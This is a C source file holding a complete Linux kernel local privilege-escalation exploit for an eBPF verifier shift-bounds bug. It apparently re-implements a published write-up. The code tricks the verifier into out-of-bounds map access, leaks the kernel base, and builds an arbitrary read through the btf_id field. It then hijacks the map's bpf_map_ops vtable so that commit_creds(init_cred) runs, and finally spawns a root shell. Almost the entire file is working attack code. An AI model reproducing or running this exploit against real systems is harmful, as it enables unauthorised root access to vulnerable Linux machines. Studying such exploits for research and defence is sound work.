#include "utils.h"
#include "task_struct_search.c"
#include "kernel_def.h"

u64 kernel_base, heap_base;
u64 array_map_ops_addr, work_for_cpu_fn_addr, commit_creds, init_cred, init_pid_ns;
u64 user_cs, user_ss, user_sp, user_rflags;

void save_state();
int run_bpf_prog(struct bpf_insn*, int, int *);
void arb_read();
u32 arb_read_32(int, int, u64);
void arb_write();

/*
-		if (umax_val >= insn_bitness) {
-			// Shifts greater than 31 or 63 are undefined.
-			// This includes shifts by a negative number.
-			//
-			mark_reg_unknown(env, regs, insn->dst_reg);
+		if (umin_val >= insn_bitness) {
+			if (alu32)
+				__mark_reg32_known(dst_reg, 0);
+			else
+				__mark_reg_known_zero(dst_reg);

*/

#define OOB_REG BPF_REG_6
#define STORE_REG BPF_REG_7
#define CONST_REG BPF_REG_8
#define EXP_REG BPF_REG_9

#define OFFSET_DATA_TO_PRIVATE_DATA_TOP 0x110
#define OFFSET_DATA_TO_BTF_ID   0x58
#define OFFSET_DATA_TO_MAP_BTF  0xD0
#define OFFSET_FILES_IN_TASK_STRUCT 0xB30
#define OFFSET_FD_ARRAY_IN_FILES_STRUCT 0xA0
#define OFFSET_PRIVATE_DATA_IN_FILE_STRUCT 0xC8

static int setup_btf_bpf_prog_fd;

#define trigger_vuln(oob_map_fd, store_map_fd)          \
        BPF_GET_MAP(oob_map_fd, 0),                     \
        BPF_MOV64_REG(OOB_REG, BPF_REG_0),              \
        BPF_GET_MAP(store_map_fd, 0),                   \
        BPF_MOV64_REG(STORE_REG, BPF_REG_0),            \
        /* trigger the bug */                           \
        BPF_MOV64_IMM(CONST_REG, 64),                   \
        BPF_MOV64_IMM(EXP_REG, 1),                      \
        /* trick the verifier to believe EXP_REG is 0 instead of 1 */ \
        /* where magic happens */                       \
        BPF_ALU64_REG(BPF_RSH, EXP_REG, CONST_REG)

        // [!] deprecated
        /* bypass fixup_bpf_calls (we dont need it actually :/) */    \
        //  BPF_MOV64_REG(BPF_REG_0, EXP_REG),              \
        //  BPF_ALU64_IMM(BPF_ADD, OOB_REG, 0x1000),        \
        //  BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 0x1000-1),      \
        //  BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),    \
        //  BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG)        

int main(int argc, char **argv)
{
    pid_t cur_pid = getpid();
    printf("[+] cur_pid: %d\n", cur_pid);

    union bpf_attr map_attr = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = sizeof(int),
        .value_size = 0x1337,
        .max_entries = 1
    };

    int store_map_fd = bpf_create_map(&map_attr);
    int oob_map_fd = bpf_create_map(&map_attr);

    if (store_map_fd < 0 || oob_map_fd < 0)
        panic("[!] Error when create bpf map!");

    printf("[+] store_map_fd: %d\n", store_map_fd);
    printf("[+] oob_map_fd: %d\n", oob_map_fd);
    
    // zeroes out the map of 2 fds 
    char vals[0x1337] = {0};

    if (bpf_update_elem(oob_map_fd, 0, vals, BPF_ANY) != 0) {
        panic("[-] Failed to update oob_map_fd element values!");
    }    

    if (bpf_update_elem(store_map_fd, 0, vals, BPF_ANY) != 0) {
        panic("[-] Failed to update store_map_fd element values!");
    }    

    struct bpf_insn leak_map_ops[] = {
        trigger_vuln(oob_map_fd, store_map_fd),
        BPF_ALU64_IMM(BPF_MUL, EXP_REG, OFFSET_DATA_TO_PRIVATE_DATA_TOP),
        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, 0),
        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, 8),
        BPF_EXIT_INSN()
    };

    if (run_bpf_prog(leak_map_ops, sizeof(leak_map_ops) / sizeof(struct bpf_insn), NULL))
        panic("[!] Failed run_bpf_prog()!");

    if (bpf_lookup_elem(store_map_fd, 0, vals))
        panic("[!] Failed bpf_lookup_elem()!");

    // array_map_ops = ((u64*)(&vals[8]))[0];  // since vals is a char array => ((u64*)(&vals[8]))[0] equivalent to ((u64*)(vals))[1]
    array_map_ops_addr = ((u64*)(vals))[1];  // since vals is a char array => ((u64*)(&vals[8]))[0] equivalent to ((u64*)(vals))[1]
    kernel_base = array_map_ops_addr - 0x10363e0;
    commit_creds = kernel_base + 0xcce30;
    init_cred = kernel_base + 0x1a6b880;
    work_for_cpu_fn_addr = kernel_base + 0xbc190;
    init_pid_ns = kernel_base + 0x1a6b2c0;

    printf("[+] kernel_base: 0x%lx\n", kernel_base);
    printf("[+] array_map_ops_addr: 0x%lx\n", array_map_ops_addr);
    printf("[+] commit_creds: 0x%lx\n", commit_creds);
    printf("[+] init_cred: 0x%lx\n", init_cred);
    printf("[+] work_for_cpu_fn_addr: 0x%lx\n", work_for_cpu_fn_addr);
    printf("[+] init_pid_ns: 0x%lx\n", init_pid_ns);

    // test arb_read
    u64 leaked;
    arb_read(oob_map_fd, store_map_fd, array_map_ops_addr, sizeof(u64), &leaked);
    printf("[+] Test leakded: 0x%lx\n", leaked);

    /* 
    the rest of the exploit based on author's writeup
    tldr: 
    _ leak task_struct of current process through radix tree search (will learn later :/)
    _ leak files_struct pointer in struct task_struct
    _ leak fd_array pointer in struct files_struct
    _ leak oob_map address from fd_array[oob_map_fd]
    _ hijack bpf_map_ops of oob_map
    _ first, overwrite bpf_map_ops->map_get_next_key with work_for_cpu_fn()
    _ next, put fake bpf_map_ops in oob_map private data
    _ then, overwrite fake bpf_map_ops to oob_map
    _ put commit_creds and init_cred to oob_map[5] and oob_map[6] respectively
    _ finally, call map_get_next_key() => commit_creds(init_cred)
    */

    // leak task_struct by cur_pid
    u64 cur_task_struct = find_task_struct_by_pid_ns(oob_map_fd, store_map_fd, cur_pid, (void*) init_pid_ns);
    printf("[+] cur_task_struct: 0x%lx\n", cur_task_struct);

    u64 files_ptr, oob_map_file, oob_map, array_map_ops[0x100] = {0};
    // leak files_ptr
    arb_read(oob_map_fd, store_map_fd, cur_task_struct + OFFSET_FILES_IN_TASK_STRUCT, sizeof(u64), &files_ptr);
    printf("[+] files_ptr: 0x%lx\n", files_ptr);

    // leak oob_map_addr in fd_array[oob_map_fd]
    arb_read(oob_map_fd, store_map_fd, files_ptr + OFFSET_FD_ARRAY_IN_FILES_STRUCT + 8 * oob_map_fd, sizeof(u64), &oob_map_file);
    printf("[+] oob_map_file: 0x%lx\n", oob_map_file);

    // leak oob_map address
    arb_read(oob_map_fd, store_map_fd, oob_map_file + OFFSET_PRIVATE_DATA_IN_FILE_STRUCT, sizeof(u64), &oob_map);
    oob_map += OFFSET_DATA_TO_PRIVATE_DATA_TOP;
    printf("[+] oob_map: 0x%lx\n", oob_map);

    arb_read(oob_map_fd, store_map_fd, array_map_ops_addr, 240, array_map_ops);
    array_map_ops[4] = work_for_cpu_fn_addr;

    arb_read_32(oob_map_fd, store_map_fd, 0);   // cleanup
    
    // write map_ops to oob_map
    if (bpf_update_elem(oob_map_fd, 0, array_map_ops, BPF_ANY))
        panic("[!] Failed to update oob_map_fd element values!");

    struct bpf_insn modify_oob_map[] = {
        trigger_vuln(oob_map_fd, store_map_fd),
        BPF_ALU64_IMM(BPF_MUL, EXP_REG, OFFSET_DATA_TO_PRIVATE_DATA_TOP),
        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 4*8), // put commit_creds to right position
        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 4*8),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 5*8), // put init_cred to right position
        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 5*8),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 6*8),
        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 0),     // overwrite oob_map which contains fake ops vtable to bpf_map_ops
        BPF_EXIT_INSN()
    };

    ((u64*)vals)[4] = commit_creds;
    ((u64*)vals)[5] = init_cred;
    ((u64*)vals)[6] = oob_map;

    if (bpf_update_elem(store_map_fd, 0, vals, BPF_ANY))
        panic("[!] Failed to update store_map_fd element values!");

    if (run_bpf_prog(modify_oob_map, sizeof(modify_oob_map) / sizeof(struct bpf_insn), NULL))
        panic("[!] Failed to run_bpf_prog");
    
    puts("[+] updated oob_map");

    uint64_t key = 0, next_key;
    union bpf_attr attr = {
        .map_fd = oob_map_fd,
        .key = &key,
        .next_key = &next_key
    };

    debug("wait");
    map_get_next_key(&attr);
    printf("[+] commit_cred(&init_cred) done!\n");
    get_shell();
    
}

int run_bpf_prog(struct bpf_insn *insn, int cnt, int *prog_fd_out)
{
    int ret = -1;
    int sockets[2] = {0};
    char verifier_log_buff[0x200000] = {0};
    union bpf_attr prog_attrs = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = cnt,
        .insns = (u64) insn,
        .license = (u64) "",
        .log_level = 2,
        .log_size = sizeof(verifier_log_buff),
        .log_buf = (u64) verifier_log_buff
    };

    int prog_fd = prog_fd_out == NULL ? -1 : *prog_fd_out;

    if (prog_fd <= 0)
        prog_fd = bpf_prog_load(&prog_attrs);

    // puts(verifier_log_buff);

    // if (prog_fd < 0) {
    //     puts(verifier_log_buff);
    //     goto cleanup;
    // }

    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets) != 0) goto cleanup;

    if (setsockopt(sockets[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(int)) != 0) goto cleanup;

    if (write(sockets[1], "huyvip", 0x6) != 0x6) goto cleanup;

    // idk what does this shit do
    if (prog_fd_out != NULL) *prog_fd_out = prog_fd;
    else close(prog_fd);

    ret = 0;

cleanup: 
    close(sockets[0]);
    close(sockets[1]);
    return ret;
}

/* 
tldr: leak through btf->id
_ first, overwrite bpf_map->btf with our wanted address       
_ in struct btf, there is a variable called id that we can read by obj_get_info_by_fd()
_ the id variable is stored at offset 0x58 of struct btf
=> overwrite bpf_map->btf with our wanted address - 0x58
*/

u32 arb_read_32(int oob_map_fd, int store_map_fd, u64 addr)
{
    char buf[0x1337] = {0};
    struct bpf_map_info_kernel kernel_info;

    union bpf_attr attr = {
        .info.bpf_fd = oob_map_fd,
        .info.info = (long long unsigned int) &kernel_info,
        .info.info_len = sizeof(kernel_info)
    };

    struct bpf_insn setup_btf[] = {
        trigger_vuln(oob_map_fd, store_map_fd),
        BPF_ALU64_IMM(BPF_MUL, EXP_REG, OFFSET_DATA_TO_MAP_BTF),
        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 8),
        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 0),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    ((u64*) buf)[1] = addr == 0 ? 0 : addr - OFFSET_DATA_TO_BTF_ID;

    if (bpf_update_elem(store_map_fd, 0, buf, BPF_ANY) != 0) {
        panic("[-] Failed to update store_map_fd element values!");
    }    

    if (run_bpf_prog(setup_btf, sizeof(setup_btf) / sizeof(struct bpf_insn), &setup_btf_bpf_prog_fd))
        panic("[!] Failed run_bpf_prog()!");

    if (addr && obj_get_info_by_fd(&attr))
        panic("[!] Failed to get map info through obj_get_info_by_fd()");

    // leak value through btf_id (u32)
    return kernel_info.btf_id;
}   

void arb_read(int oob_map_fd, int store_map_fd, u64 addr, u64 len, void *buf)
{
    for (int i=0;i<len/4;i++) {
        u32 val = arb_read_32(oob_map_fd, store_map_fd, addr + i*4);
        ((u32*) buf)[i] = val;
    }
}
